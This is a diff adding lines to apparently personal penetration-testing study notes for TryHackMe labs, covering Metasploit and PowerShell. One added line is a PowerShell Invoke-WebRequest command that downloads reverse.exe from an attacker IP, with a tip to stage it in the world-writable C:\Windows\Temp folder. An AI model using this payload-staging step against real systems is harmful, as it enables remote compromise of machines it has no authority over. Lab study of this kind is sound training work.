@@ -31,6 +31,7 @@ Enumeration:
         Metasploit(msfconsole) - Database with interactive shell to run known exploits on targets. 
             * ALWAYS SET LHOST TO BE THM VPN IP!!!!!!!
             * ALWAYS SET THE LHOST, PAYLOAD, AND LPORT WHEN USING METERPRETER SHELL FOR WINDOWS MACHINES
+            * On windows, "C:\Windows\Temp" is typically a folder that is world writable.
 
     ---------------------------------------
 
@@ -140,3 +141,8 @@ Nmap commands:
 ---------------------------------------------------------------------------------
 
 Windows Powershell  (WTF)
+
+    powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe - To do a Windows equivalent of a wget with powershell.
+        - Make sure you are in a world-writable directory such as C://Windows/Temp/
+
+
